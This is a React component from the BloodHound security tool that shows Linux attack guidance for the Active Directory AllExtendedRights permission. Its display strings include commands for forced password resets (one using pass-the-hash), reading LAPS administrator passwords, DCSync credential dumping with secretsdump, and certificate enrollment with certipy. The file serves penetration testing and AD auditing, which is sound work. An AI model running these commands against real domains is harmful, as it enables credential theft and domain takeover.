// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { EdgeInfoProps } from '../index';
import { Link, Typography } from '@mui/material';

const LinuxAbuse: FC<EdgeInfoProps> = ({ sourceName, targetName, targetType }) => {
    switch (targetType) {
        case 'User':
            return (
                <>
                    <Typography variant='body2'>
                        The AllExtendedRights permission grants {sourceName} the ability to change the password of the
                        user {targetName} without knowing their current password. This is equivalent to the
                        "ForceChangePassword" edge in BloodHound.
                    </Typography>

                    <Typography variant='body2'>
                        Use samba's net tool to change the user's password. The credentials can be supplied in cleartext
                        or prompted interactively if omitted from the command line. The new password will be prompted if
                        omitted from the command line.
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        It can also be done with pass-the-hash using{' '}
                        <Link target='_blank' rel='noopener' href='https://github.com/byt3bl33d3r/pth-toolkit'>
                            pth-toolkit's net tool
                        </Link>
                        . If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
                        }
                    </Typography>
                </>
            );
        case 'Computer':
            return (
                <>
                    <Typography variant='body2'>
                        The AllExtendedRights permission allows {sourceName} to retrieve the LAPS (RID 500
                        administrator) password for {targetName}.
                    </Typography>
                    <Typography variant='body2'>
                        For systems using legacy LAPS, the following AD computer object properties are relevant:
                        <br />
                        <b>- ms-Mcs-AdmPwd</b>: The plaintext LAPS password
                        <br />
                        <b>- ms-Mcs-AdmPwdExpirationTime</b>: The LAPS password expiration time
                        <br />
                    </Typography>
                    <Typography variant='body2'>
                        For systems using Windows LAPS (2023 edition), the following AD computer object properties are
                        relevant:
                        <br />
                        <b>- msLAPS-Password</b>: The plaintext LAPS password
                        <br />
                        <b>- msLAPS-PasswordExpirationTime</b>: The LAPS password expiration time
                        <br />
                        <b>- msLAPS-EncryptedPassword</b>: The encrypted LAPS password
                        <br />
                        <b>- msLAPS-EncryptedPasswordHistory</b>: The encrypted LAPS password history
                        <br />
                        <b>- msLAPS-EncryptedDSRMPassword</b>: The encrypted Directory Services Restore Mode (DSRM)
                        password
                        <br />
                        <b>- msLAPS-EncryptedDSRMPasswordHistory</b>: The encrypted DSRM password history
                        <br />
                    </Typography>
                    <Typography variant='body2'>
                        Plaintext attributes can be read using a simple LDAP client. For example, with bloodyAD:
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"
                        }
                    </Typography>
                    <Typography variant='body2'>
                        See Windows abuse for retrieving and decrypting the encrypted attributes.
                    </Typography>
                </>
            );
        case 'Domain':
            return (
                <>
                    <Typography variant='body1'>DCSync</Typography>

                    <Typography variant='body2'>
                        The AllExtendedRights permission grants {sourceName} both the DS-Replication-Get-Changes and
                        DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects
                        from the domain {targetName}.
                    </Typography>

                    <Typography variant='body2'>
                        This can be abused using Impacket's secretsdump.py example script:
                    </Typography>

                    <Typography component={'pre'}>
                        {"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}
                    </Typography>
                </>
            );
        case 'CertTemplate':
            return (
                <>
                    <Typography variant='body2'>
                        The AllExtendedRights permission grants {sourceName} enrollment rights on the certificate
                        template {targetName}.
                    </Typography>
                    <Typography variant='body2'>Certipy can be used to enroll a certificate:</Typography>
                    <Typography component={'pre'}>
                        {'certipy req -u USER@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE'}
                    </Typography>
                    <Typography variant='body2'>
                        The following additional requirements must be met for a principal to be able to enroll a
                        certificate:
                        <br />
                        1) The certificate template is published on an enterprise CA
                        <br />
                        2) The principal has Enroll permission on the enterprise CA
                        <br />
                        3) The principal meets the issuance requirements and the requirements for subject name and
                        subject alternative name defined by the template
                    </Typography>
                </>
            );
        default:
            return (
                <>
                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
                </>
            );
    }
};

export default LinuxAbuse;
